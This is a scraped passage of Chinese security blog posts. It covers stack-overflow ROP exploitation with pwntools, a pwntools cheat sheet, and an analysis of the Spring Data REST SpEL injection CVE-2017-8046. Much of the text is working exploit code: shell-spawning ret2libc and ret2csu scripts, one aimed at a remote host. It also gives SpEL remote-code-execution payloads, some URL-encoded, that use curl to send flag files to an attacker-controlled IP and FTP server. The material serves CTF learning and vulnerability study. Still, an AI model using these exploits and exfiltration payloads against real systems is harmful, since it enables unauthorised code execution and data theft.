elf.plt[\"read\"]vulfun_addr = elf.symbols[\"vulnerable_function\"]print \"[*]write() plt: \" + hex(plt_write)print \"[*]read() plt: \" + hex(plt_read)print \"[*]vulnerable_function() addr: \" + hex(vulfun_addr)print \"[*].bss addr: \" + hex(bss_base)def leak(address): payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4) p.send(payload1) data = p.recv(4) #print \"%#x =&gt; %s\" % (address, (data or '').encode('hex')) return datad = DynELF(leak, elf=ELF('./level2'))execve_addr = d.lookup('execve', 'libc')print \"[*]execve() addr: \" + hex(execve_addr)#system_addr = d.lookup('system', 'libc')#print \"[*]system() addr: \" + hex(system_addr)pop_pop_pop_ret = 0x080484f9payload2 = \"A\" * 140 + p32(plt_read) + p32(pop_pop_pop_ret) + p32(0) + p32(bss_base) + p32(8)#payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_base)payload2 += p32(execve_addr) + p32(vulfun_addr) + p32(bss_base) + p32(0) + p32(0)p.sendline(payload2)p.sendline(\"/bin/sh\\0\")p.interactive() 本地环境中system()函数执行有问题，老得不到shell，换了execve()函数即可： 0x02 64位ROPlevel3——64位与32位区别 linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9中，如果还有更多的参数的话才会保存在栈上。 level3.c代码如下： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void callsystem()&#123; system(\"/bin/sh\");&#125;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, \"Hello, World\\n\", 13); vulnerable_function();&#125; 默认打开系统的ASLR，然后用如下gcc命令编译，即不开启Canary： 1gcc -fno-stack-protector level3.c -o level3 查看基本功能和安全编译选项开关： 通过GDB的调试，用pattern创建大量字符串发送过去，程序终止在vulnerable_function()函数处： 奇怪的事情发生了，PC指针并没有指向类似于0x41414141那样地址，而是停在了vulnerable_function()函数中。这是为什么呢？原因就是我们之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。 因此我们得到了136的偏移地址。 我们再构造一次payload，并且跳转到一个小于0x00007fffffffffff的地址，看看这次能否控制pc的指针： 123python -c 'print \"A\"*136+\"ABCDEF\\x00\\x00\"' &gt; payloadgdb level3(gdb) r &lt; payload 可以看到我们已经成功的控制了PC的指针了。 知道了偏移量，且程序中本来就存在一个callsystem()函数，其会直接调用system(“/bin/sh”)，那就简单多了。 编写payload： 12345678910111213from pwn import *p = process(\"./level3\")elf = ELF(\"./level3\")callsystem_addr = elf.symbols[\"callsystem\"]print \"[*]callsystem() addr: \" + hex(callsystem_addr)payload = \"A\" * 136 + p64(callsystem_addr)print \"[*]sending payload...\"p.sendline(payload)p.interactive() level4——使用工具寻找gadgets 我们之前提到x86中参数都是保存在栈上，但在x64中前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于pop rdi; ret的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些查找gadgets的工具比较方便。比较有名的工具有： ROPEME: https://github.com/packz/ropeme Ropper: https://github.com/sashs/Ropper ROPgadget: https://github.com/JonathanSa… rp++: https://github.com/0vercl0k/rp 这些工具功能上都差不多，找一款自己能用的惯的即可。 level4.c代码如下： 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;dlfcn.h&gt;void systemaddr()&#123; void* handle = dlopen(\"libc.so.6\", RTLD_LAZY); printf(\"%p\\n\",dlsym(handle,\"system\")); fflush(stdout);&#125;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; systemaddr(); write(1, \"Hello, World\\n\", 13); vulnerable_function();&#125; 编译，因为程序用到了dlopen()函数打开libc，因此需要-ldl参数： 1gcc -fno-stack-protector level4.c -o level4 -ldl 64位程序，动态链接文件，只开启了NX： 用IDA分析，看到程序在一开始运行时调用systemaddr()函数，该函数会从本程序用到的libc.so.6中获取其中的system()函数地址并打印出来： 和level3一样得到溢出偏移量为136。 下面开始使用工具来寻找合适的Gadgets。 因为我们知道了溢出偏移量和system()函数的地址，剩下的就是通过寄存器给system()函数传参了，而在64位中传参的前六个参数是通过寄存器来实现的，而且system()只接受一个参数，因此我们需要找到一条pop rdi;ret的Gadget来帮助我们实现，这里我们用的是ROPgadget工具帮我们查找： 当然，一般情况下自身的程序可能没有合适的Gadgets，这时我们可以到指定的libc.so文件中找到合适的： 编写payload，有两个Gadget可选，如果用的是libc中的Gadget则需要加上libc的实际地址来计算出该gadget的实际地址，因为libc.address = offset = system_addr - libc.symbols[‘system’] = gadget实际地址 - gadget在libc中地址： 1234567891011121314151617181920212223242526from pwn import *p = process(\"./level4\")elf = ELF(\"./level4\")libc = elf.libc## self gadget#pop_rdi_ret_addr = 0x00000000004008b3## libc gadgetpop_rdi_ret_libc = 0x0000000000021102system_addr = int(p.recv(1024).split()[0], 16)print \"[*]recv system() addr: \" + hex(system_addr)libc.address = system_addr - libc.symbols[\"system\"]binsh_addr = next(libc.search(\"/bin/sh\"))## libc gadget + libc addrpop_rdi_ret_addr = pop_rdi_ret_libc + libc.addressprint \"[*]/bin/sh libc addr: \" + hex(binsh_addr)payload = \"A\" * 136 + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)print \"[*]sending payload...\"p.sendline(payload)p.interactive() 除了前面找的pop rdi;ret这个Gadget，我们还可以找另外一个gadget，因为我们只需调用一次system()函数就可以获取shell，所以我们也可以搜索不带ret的gadgets来构造ROP链，如下： 可以看到pop rax;pop rdi;call rax这个gadget，我们可以先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。 payload： 12345678910111213141516171819202122232425262728293031from pwn import *p = process(\"./level4\")elf = ELF(\"./level4\")libc = elf.libc#pop|ret## self gadget#pop_rdi_ret_addr = 0x00000000004008b3## libc gadget#pop_rdi_ret_libc = 0x0000000000021102#pop|callpop_call_libc = 0x0000000000107419system_addr = int(p.recv(1024).split()[0], 16)print \"[*]recv system() addr: \" + hex(system_addr)libc.address = system_addr - libc.symbols[\"system\"]binsh_addr = next(libc.search(\"/bin/sh\"))#pop_rdi_ret_addr = pop_rdi_ret_libc + libc.addresspop_call_addr = pop_call_libc +libc.addressprint \"[*]/bin/sh libc addr: \" + hex(binsh_addr)#payload = \"A\" * 136 + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)payload = \"A\" * 136 + p64(pop_call_addr) + p64(system_addr) + p64(binsh_addr)print \"[*]sending payload...\"p.sendline(payload)p.interactive() level5——通用gadgets 因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。 level5.c代码如下，相比于level3和level4，去掉了提供system()或其地址的辅助函数： 12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, \"Hello, World\\n\", 13); vulnerable_function();&#125; 可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段，最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./level5观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。 编译： 1gcc -fno-stack-protector -o level5 level5.c 基本功能和安全编译开关和前面的一致。 溢出偏移量也和之前的一致，为136。 用objdump -d ./level5观察一下__libc_csu_init()这个函数： 可以看到，利用0x40061a处的代码可以控制rbx、rbp、r12、r13、r14和r15的值，随后利用0x400600处的代码可以将r13的值赋值给rdx、r14的值赋值给rsi、r15的值赋值给edi（这和蒸米原文的顺序是相反的，因为本地编译出来的程序所用的gadget有些许区别，其实这里利用的就是ret2csu技巧），随后就会调用call qword ptr [r12+rbx*8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。 这里列两种getshell的方法。 Method1——只用ret2csu的Gadget第一种是蒸米讲解的方法，即利用该gadget构造3段payload，分别是泄露write()函数地址、向程序.bss段写入”/bin/sh”和system()或execve()函数地址、传入bss_addr+8处的参数并调用bss_addr地址处的函数即执行system(“/bin/sh”)。 最终exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *p = process('./level5')#p = remote('192.168.17.155',10001)elf = ELF('level5')libc = elf.libcmain = elf.symbols['main']bss_addr = elf.bss()gadget1 = 0x40061agadget2 = 0x400600got_write = elf.got['write']print \"[*]write() got: \" + hex(got_write)got_read = elf.got['read']print \"[*]read() got: \" + hex(got_read)def csu(rbx, rbp, r12, r13, r14, r15, ret): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = \"A\" * 136 payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(gadget2) payload += \"B\" * 56 payload += p64(ret) return payload#write(rdi=1, rsi=write.got, rdx=4)payload1 = csu(0, 1, got_write, 8, got_write, 1, main)p.recvuntil(\"Hello, World\\n\")print \"\\n#############sending payload1#############\\n\"p.send(payload1)sleep(1)write_addr = u64(p.recv(8))print \"[*]leak write() addr: \" + hex(write_addr)libc.address = write_addr - libc.symbols['write']execve_addr = libc.symbols[\"execve\"]print \"[*]execve() addr: \" + hex(execve_addr)p.recvuntil(\"Hello, World\\n\")#read(rdi=0, rsi=bss_addr, rdx=16)payload2 = csu(0, 1, got_read, 16, bss_addr, 0, main)print \"\\n#############sending payload2#############\\n\"p.send(payload2)sleep(1)p.send(p64(execve_addr))p.send(\"/bin/sh\\0\")sleep(1)p.recvuntil(\"Hello, World\\n\")#execve(rdi = bss_addr+8 = \"/bin/sh\", rsi=0, rdx=0)payload3 = csu(0, 1, bss_addr, 0, 0, bss_addr + 8, main)print \"\\n#############sending payload3#############\\n\"sleep(1)p.send(payload3)p.interactive() 简单说下： 由于利用到泄露函数地址和向.bss段写内容的功能，需要先获取write()和read()函数的GOT地址； 本次利用的Gadget即ret2csu，定义一个csu函数，用于构造Gadget传参构造payload，其中payload构造是先填充溢出偏移量的字符、然后根据gadget1来设置对应寄存器的值、再调用gadget2、然后填充字符至gadget1的ret指令处、最后调用输入的返回地址即main处让程序继续执行下去；这里注意两个偏移量，第一个136是程序本身溢出到ret的偏移量，而第二个56则是gadget2跑完之后还要继续往下跑到gadget1的ret中去，这中间需要填充56个字节； payload1利用write()输出write在内存中的地址。注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止； 当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着构造payload2，利用read()将system()或execve()的地址以及“/bin/sh”读入到.bss段内存中； 最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。 在我的本地环境中，利用system()的exp会得不到shell，换了execve()才可以： Method2——利用两个Gadgets其实不用向.bss段写内容再调用，有点繁琐，且同一个Gadget调用了3次。 除了利用ret2csu的gadget，这里还利用到pop rdi|ret这个gadget，主要用于给system(函数的第一个参数赋值并返回往下调用system()函数从而getshell： 基本利用过程就是：通过ret2csu的gadget泄露write()函数的真实地址，通过LibcSearcher或查询的方式得到libc的offset然后计算出system()函数和”/bin/sh”的真实地址，最后利用pop rdi|ret这个gadget构造exp执行system(“/bin/sh”)。 payload如下，下面将改为远程连接的形式： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *from LibcSearcher import *# p = process('./level5')p = remote('192.168.17.155',10001)elf = ELF('level5')gadget1 = 0x40061agadget2 = 0x400600pop_rdi_ret = 0x0000000000400623main_addr = elf.symbols['main']write_got = elf.got['write']print \"[*]main() addr: \" + hex(main_addr)print \"[*]write() got: \" + hex(write_got)def csu(rbx, rbp, r12, r13, r14, r15, ret): payload = \"A\" * 136 payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(gadget2) payload += \"B\" * 56 payload += p64(ret) return payload#write(rdi=1, rsi=write.got, rdx=4)payload = csu(0, 1, write_got, 8, write_got, 1, main_addr)p.recvuntil(\"Hello, World\\n\")print \"[*]sending payload to leak write addr...\"p.send(payload)sleep(1)write_addr = u64(p.recv(8))print \"[*]leak write() addr: \" + hex(write_addr)libc = LibcSearcher('write', write_addr)libc_base = write_addr - libc.dump('write')system_addr = libc_base + libc.dump('system')binsh_addr = libc_base + libc.dump('str_bin_sh')print \"[*]system() addr: \" + hex(system_addr)print \"[*]/bin/sh addr: \" + hex(binsh_addr)p.recvuntil(\"Hello, World\\n\")print \"[*]sending exp...\"exp = \"A\" * 136exp += p64(pop_rdi_ret)exp += p64(binsh_addr)exp += p64(system_addr)p.sendline(exp)p.interactive() 当然，也可以不用LibcSearcher这个工具包，而是直接通过查询Libc Database Search的方式自己写地址： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *# p = process('./level5')p = remote('192.168.17.155',10001)elf = ELF('level5')gadget1 = 0x40061agadget2 = 0x400600pop_rdi_ret = 0x0000000000400623main_addr = elf.symbols['main']write_got = elf.got['write']print \"[*]main() addr: \" + hex(main_addr)print \"[*]write() got: \" + hex(write_got)def csu(rbx, rbp, r12, r13, r14, r15, ret): payload = \"A\" * 136 payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(gadget2) payload += \"B\" * 56 payload += p64(ret) return payload#write(rdi=1, rsi=write.got, rdx=4)payload = csu(0, 1, write_got, 8, write_got, 1, main_addr)p.recvuntil(\"Hello, World\\n\")print \"[*]sending payload to leak write addr...\"p.send(payload)sleep(1)write_addr = u64(p.recv(8))print \"[*]leak write() addr: \" + hex(write_addr)## libc db search## leak write low 3: 2b0system_offset = 0x045390binsh_offset = 0x18cd57write_offset = 0x0f72b0libc_base = write_addr - write_offsetsystem_addr = libc_base + system_offsetbinsh_addr = libc_base + binsh_offsetprint \"[*]system() addr: \" + hex(system_addr)print \"[*]/bin/sh addr: \" + hex(binsh_addr)p.recvuntil(\"Hello, World\\n\")print \"[*]sending exp...\"exp = \"A\" * 136exp += p64(pop_rdi_ret)exp += p64(binsh_addr)exp += p64(system_addr)p.sendline(exp)p.interactive() getshell： 0x03 参考一步一步学ROP之Linux_x86篇 一步一步学ROP之Linux_x64篇","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://www.mi1k7ea.com/tags/栈溢出/"},{"name":"Pwn","slug":"Pwn","permalink":"https://www.mi1k7ea.com/tags/Pwn/"}]},{"title":"pwntools笔记","date":"2019-04-07T14:52:27.000Z","path":"2019/04/07/pwntools笔记/","text":"0x01 简介pwntools是一个CTF Pwn漏洞利用开发库，用于编写各种与Pwn题目进行交互和攻击利用的脚本。其由Python开发，由rapid设计，旨在让使用者简单快速的编写exploit。 0x02 安装安装：pip install pwntools 当然只是在Linux环境适用，建议安装在Ubuntu环境而非Kali，Kali上会有很多问题。其中对Ubuntu 12.04和14.04的支持最好，但是绝大多数的功能也支持Debian、Arch、FreeBSD、OSX等等。 0x03 各个模块通常在py文件头部写上from pwn import *即可导入所有需要的pwntools工具。 连接方式123sh = porcess(\"./test\")#连接本地程序sh = remote(\"127.0.0.1\",10001)#远程连接sh.close()#关闭连接 IO模块12345678sh.send(data)#发送数据sh.sendline(data)#发送一行数据，相当于在数据后面加\\nsh.recv(numb = 2048, timeout = dufault)#接受数据，numb指定接收的字节，timeout指定超时时间sh.recvline(keepends=True)#接受一行数据，keepends为是否保留行尾的\\nsh.recvuntil(\"Hello,World\\n\",drop=fasle)#接受数据直到我们设置的标志出现sh.recvall()#一直接收直到EOFsh.recvrepeat(timeout = default)#持续接受直到EOF或timeoutsh.interactive()#直接进行交互，相当于回到shell的模式，在取得shell之后使用 ELF文件操作12345678910111213141516&gt;&gt;&gt; e = ELF('/bin/cat')&gt;&gt;&gt; print hex(e.address) # 文件装载的基地址0x400000&gt;&gt;&gt; print hex(e.symbols['write']) # 函数地址0x401680&gt;&gt;&gt; print hex(e.got['write']) # GOT表的地址0x60b070&gt;&gt;&gt; print hex(e.plt['write']) # PLT的地址0x401680&gt;&gt;&gt; print hex(e.search('/bin/sh').next())# 字符串/bin/sh的地址#libc相关libc = e.libclibc.address = libc_start_main_addr - libc.symbols['__libc_start_main']libc.symbols['system']next(libc.search('/bin/sh')) 整数pack与数据unpackpack：p32，p64unpack：u32，u64 汇编和反汇编汇编： 1234&gt;&gt;&gt; asm('nop')'\\x90'&gt;&gt;&gt; asm('nop', arch='arm')'\\x00\\xf0 \\xe3' 可以使用context来指定cpu类型以及操作系统： 1234&gt;&gt;&gt; context.arch = 'i386'&gt;&gt;&gt; context.os = 'linux'&gt;&gt;&gt; context.endian = 'little'&gt;&gt;&gt; context.word_size = 32 使用disasm进行反汇编： 12345&gt;&gt;&gt; print disasm('6a0258cd80ebf9'.decode('hex')) 0: 6a 02 push 0x2 2: 58 pop eax 3: cd 80 int 0x80 5: eb f9 jmp 0x0 注意，asm需要binutils中的as工具辅助，如果是不同于本机平台的其他平台的汇编，例如在我的x86机器上进行mips的汇编就会出现as工具未找到的情况，这时候需要安装其他平台的cross-binutils。 Shellcode生成器12345678&gt;&gt;&gt; print shellcraft.i386.nop().strip('\\n') nop&gt;&gt;&gt; print shellcraft.i386.linux.sh() /* push '/bin///sh\\x00' */ push 0x68 push 0x732f2f2f push 0x6e69622f... 结合asm可以可以得到最终的pyaload： 12345678from pwn import *context(os='linux',arch='amd64')shellcode = asm(shellcraft.sh())或者from pwn import *shellcode = asm(shellcraft.amd64.linux.sh()) 除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等。 ROP链生成器12345678910elf = ELF('ropasaurusrex')rop = ROP(elf)rop.read(0, elf.bss(0x80))rop.dump()# ['0x0000: 0x80482fc (read)',# '0x0004: 0xdeadbeef',# '0x0008: 0x0',# '0x000c: 0x80496a8']str(rop)# '\\xfc\\x82\\x04\\x08\\xef\\xbe\\xad\\xde\\x00\\x00\\x00\\x00\\xa8\\x96\\x04\\x08' 使用ROP(elf)来产生一个rop的对象，这时rop链还是空的，需要在其中添加函数。 因为ROP对象实现了getattr的功能，可以直接通过func call的形式来添加函数，rop.read(0, elf.bss(0x80))实际相当于rop.call(‘read’, (0, elf.bss(0x80)))。 通过多次添加函数调用，最后使用str将整个rop chain dump出来就可以了。 call(resolvable, arguments=()) : 添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号) chain() : 返回当前的字节序列，即payload dump() : 直观地展示出当前的rop chain raw() : 在rop chain中加上一个整数或字符串 search(move=0, regs=None, order=’size’) : 按特定条件搜索gadget unresolve(value) : 给出一个地址，反解析出符号 GDB调试当在运行py时添加参数M，则会将进程attach到GDB上调试： 12if args.M: gdb.attach(p) DEBUG日志当 context.log_level被设置为 “DEBUG” , 我们的输入和服务器的输出会被直接输出： 1context.log_level = 'DEBUG' 0x04 参考pwntools使用","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"},{"name":"Pwn","slug":"Pwn","permalink":"https://www.mi1k7ea.com/tags/Pwn/"}]},{"title":"浅析Spring Data Rest之cve-2017-8046","date":"2019-04-04T16:38:13.000Z","path":"2019/04/05/Spring-Data-Rest之cve-2017-8046分析/","text":"0x01 何为Spring Data Rest Spring Data REST是基于Spring Data的repository之上，可以把 repository 自动输出为REST资源，目前支持Spring Data JPA、Spring Data MongoDB、Spring Data Neo4j、Spring Data GemFire、Spring Data Cassandra的 repository 自动转换成REST服务。注意是自动。简单点说，Spring Data REST把我们需要编写的大量REST模版接口做了自动化实现。 0x02 CVE-2017-8046CVE-2017-8046: RCE in PATCH requests in Spring Data REST 简单地说，该漏洞就是攻击者通过Spring Data Rest支持的PATCH方法，构造恶意的Json格式数据发送到服务端，导致服务端在解析数据时会执行任意Java代码、解析SpEL表达式，从而引发SpEL注入漏洞、造成RCE。 影响版本： Spring Data REST versions 2.5.12, 2.6.7, 3.0 RC3之前的版本 Spring Boot versions 2.0.0M4 之前的版本 Spring Data release trains Kay-RC3 之前的版本 漏洞具体信息参考链接。 有个注意点，请求方法为PATCH，Content-Type要设置为application/json-patch+json才能正常访问。 0x03 漏洞分析在github下载一个漏洞Demo jar包。 本地运行并设置远程调试端口： 1java -Xdebug -Xrunjdwp:transport=dt_socket,address=8666,server=y,suspend=n -server -jar spring-data-rest.jar 基本操作访问一遍，显示有两个子路径可以访问： /persons显示已有哪些创建了的用户，而/profile只有一个子目录/profile/persons、其用来配置persons页面的字段属性等信息。 下面正常操作一遍，先创建用户，GET查看到用户信息： 利用PATCH方法的replace操作修改lastName： 漏洞点本次CVE的漏洞出发点在PATCH请求进行某些操作如replace时的path参数存在SpEL注入风险，Spring Data Rest在解析该参数值时会使用spelExpress解析SpEL表达式而未进行任何的校验。 我们可以简单地以上面的PATCH例子往path中注入一下SpEL表达式，作用是本地弹出计算器，注意payload后面的斜杠/必须带上，但lastName可以随意更换为其他内容（至于原因可在下面的调试分析中得知）： 1T(java.lang.Runtime).getRuntime().exec('calc.exe')/lastName 调试分析刚刚已经开了进行远程调试监听的8666端口，直接用IDEA远程连接即可。 简单说下操作：将jar包解压，在IDEA中创建新项目，再右键项目点击Open Module Settings打开设置，在Modules一栏点击右边的+加号添加jar解压后的目录中的lib目录进来，然后点击Apply和OK；点击Run栏，选择Edit Configurations，点击+加号添加Remote，设置IP和端口号为8666，然后点击Debug，当显示Connected to the target VM, address: ‘127.0.0.1:8666’, transport: ‘socket’时即连接成功。 断点打在哪？ 我们前面的Demo示例是通过PATCH方法的replace操作来触发漏洞的，也就是说，我们的操作必然会经过PATCH方法的replace操作类，那么我们找到这个类打断点，程序就必然会经过并停止在该断点，然后我们通过函数调用栈窗口可以反推之前调用哪些类方法，再返回去在关键的地方打断点重新调试即可。 这里我们找到该类在如下路径： 1spring-data-rest/BOOT-INF/lib/spring-data-rest-webmvc-2.6.6.RELEASE.jar!/org/springframework/data/rest/webmvc/json/patch/ReplaceOperation.class 在该处打下断点，必然会经过此处，且看到函数调用栈中有个JsonPatchHandler类，该类应该算是处理Json格式的PATCH请求的类： 到JsonPatchHandler类的apply()和applyPatch()打下断点，重新调试会发现，JsonPatchHandler.apply()方法会调用isJsonPatchRequest()判断请求是否是Json格式的Patch，跟踪进去会发现会校验请求方法是否为PATCH且Content-Type是否为application/json-patch+json，否则会抛出错误，这就是为什么Content-Type必须设置为该值才能触发的原因： 跟踪往下调试进去applyPatch()，其后调用了Patch.convert()，其中识别出replace操作： 继续调试进去，会有个初始化Patch操作的构造函数，从这里可以看到前面Demo为啥需要op等3个参数，且最后一个成员变量spelExpression即是用来解析SpEL表达式的变量，它是SpEL注入漏洞的触发根源，这里调用PathToSpEL.pathToExpression()来解析path参数： 继续跟进调试，发现其进行一个split()切分/的操作，这就解释了为啥Demo的payload中path参数值需要在exp后加上/，因为它这里必须切分路径，而默认正常情况下是“/lastName”： 接着是调用pathNodesToSpEL()，通过调试发现是对/转换为.，然后将path前后路径用.进行拼接： 往下调试，有个初始化spelExpression类对象，其中expression成员变量值为我们注入的SpEL表达式： 往下调试，会创建一个PATCH对象并初始化，然后调用operation.perform()执行PATCH指定操作： 跟进去，调用了setValueOnTarget()，再往后走就是SpEL解析了： 这里我们跟进去看看evaluateValueFromTarget()，顾名思义，该方法用来计算出SpEL表达式的值，其是调用之前初始化好的spelExpression成员变量来解析SpEL表达式： 再往下就是解析完成弹框计算器了。 补丁分析我们看下官方补丁的修补方法： 补丁就是在evaluateValueFromTarget()函数内添加了对path参数值的路径进行合法性校验，若为非法内容则直接抛出错误。 0x04 exp构造通用exp之前本地的exp是，但是这个只能用于本地环境测试： 1T(java.lang.Runtime).getRuntime().exec('calc.exe')/lastName 换一个远程服务的exp就不能上面那样写了，因为没有回显，下面有两种解决办法。 Method1——执行curl带回flag 当然这种情况是目标机子存在curl命令且能够解析`反引号执行命令。 1T(java.lang.Runtime).getRuntime().exec('curl yourip:port/?c=`cat flag`')/lastName 但是从前面的调试知道，程序会切分/，因此命令中的/会被切分导致不能到达预期效果，这时就引入了第二种更方便的方法。 Method2——构造回显exp 情况当然没有那么好，`反引号很多时候会无法被正常解析，这时就使用如下的StreamUtils包的copy()方法实现输入输出流来构造回显exp即可。 1T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec('cat flag.txt').getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())/Mi1k7ea 示例以Windows本地为例： 使用JavaScipt引擎和之前的javacon中的exp类似，这里再演示一遍。 先来本地弹计算器测试： 1T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval(T(java.lang.Runtime).getRuntime().exec('calc.exe'))/Mi1k7ea Method1——URL编码 前面遇到的情况是通用exp是一样的，即无法在命令中输入/，但我们可以通过URL编码绕过： URL编码内容为： 1java.lang.Runtime.getRuntime().exec(&apos;curl http://192.168.43.201:1234/?`whoami`&apos;) exp： 1T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval(T(java.net.URLDecoder).decode('%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%34%33%2e%32%30%31%3a%31%32%33%34%2f%3f%60%77%68%6f%61%6d%69%60%27%29'))/Mi1k7ea 可以看到是执行成功了，但是`反引号并没有被成功解析成命令执行。 这时用curl -T参数来将flag带回我们的FTP服务器中： 1T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval(T(java.net.URLDecoder).decode('%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%75%72%6c%20%2d%54%20%66%6c%61%67%2e%74%78%74%20%66%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%34%33%2e%32%30%31%27%29'))/Mi1k7ea 其中URL编码内容为： 1java.lang.Runtime.getRuntime().exec('curl -T flag.txt ftp://192.168.43.201') Method2——构造回显exp 和通用exp中一样，利用一样的包的copy()方法实现回显。 1T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval(T(java.lang.Runtime).getRuntime().exec('calc')),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())/Mi1k7ea 这个exp只能在Windows本地打开计算器等文件的功能，执行变量其他操作类的命令： 添加个URL编码： 1T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval(T(java.net.URLDecoder).decode('%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%70%63%6f%6e%66%69%67%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29')),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())/Mi1k7ea 其中URL编码内容为： 1java.lang.Runtime.getRuntime().exec(\"ipconfig\").getInputStream() 工具直接参考Github上的一个项目即可。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"SpEL注入","slug":"SpEL注入","permalink":"https://www.mi1k7ea.com/tags/SpEL注入/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"0CTF 